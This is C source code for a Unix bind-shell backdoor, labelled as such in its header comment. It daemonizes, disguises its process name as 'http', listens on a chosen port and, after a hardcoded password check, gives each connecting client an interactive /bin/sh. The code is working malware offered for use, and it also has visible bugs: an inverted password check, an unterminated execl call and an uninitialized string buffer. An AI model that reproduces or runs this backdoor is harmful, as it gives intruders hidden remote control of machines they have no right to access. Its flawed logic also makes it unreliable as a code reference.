/* 
   Another simple backdoor
    +hidden process name
    +password
    +interacive port choice
   www.nitrox.xt.pl
*/ 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <errno.h>

#define PASS "back"
#define BACKLOG 2
#define FAKE "http"
#define WELCOME "Welcome to: "

int main(int argc, char **argv)
{
 int PORT;
 int my_sock, other_sock;
 int so_sock;
 int opt = 1;
 int i,x;
 char buffer[81];
 char localaddr[81];
 struct sockaddr_in my;
 struct sockaddr_in other;
  if (argc<2)
   exit(printf("Use: %s <port>\n",argv[0]));
  if ((atoi(argv[1]))>999999999)
   exit(printf("Bad port value [port<=999999999]\n"));
 PORT=atoi(argv[1]);
 my.sin_family = PF_INET;
 my.sin_port = htons(PORT);
 my.sin_addr.s_addr = INADDR_ANY;
 bzero(&(my.sin_zero),8);
 
 daemon();
 strcpy(argv[0],"               "); 
 strcpy(argv[0],FAKE);
 
 if((my_sock=socket(PF_INET,SOCK_STREAM,0)) < 0) {
  perror("--Socket error");
  exit(1);
 }
 if(bind(my_sock,(struct sockaddr *)&my,sizeof(my))<0) {
  perror("--Bind error");
  exit(1);
 }
 if(setsockopt(my_sock,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt))<0) {
  perror("--Set Socket error");
  exit(1);
 }
 if((listen(my_sock,BACKLOG))<0) {
  perror("--Listen Error");
  exit(1);
 }
 so_sock=sizeof(struct sockaddr_in);
  while(1)
  {
    if((other_sock=accept(my_sock,(struct sockaddr *)&other,&so_sock))<0) {
     perror("--Accept error");
     continue;
    }
   //printf("Got connection from: %s\n", inet_ntoa(other.sin_addr));
   strcat(localaddr,WELCOME);
   strcat(localaddr,inet_ntoa(my.sin_addr));
   strcat(localaddr,"\n");
   if (!fork()) {
    bzero (buffer, sizeof (buffer));
    recv(other_sock, buffer, sizeof (buffer), 0);
    if(!strcmp(PASS,buffer)) 
     exit(0);
     send(other_sock,"www.nitrox.xt.pl\n",18,0); 
     send(other_sock,localaddr,(strlen(localaddr)+1),0);
     send(other_sock,"Executing system shell... [/bin/sh -i]\n",40,0);
     dup2(other_sock,0);
     dup2(other_sock,1); 
     dup2(other_sock,2); 
     execl("/bin/sh","sh","-i");
     exit(0); 
   }
   close(other_sock);
  } 
 return 0;
}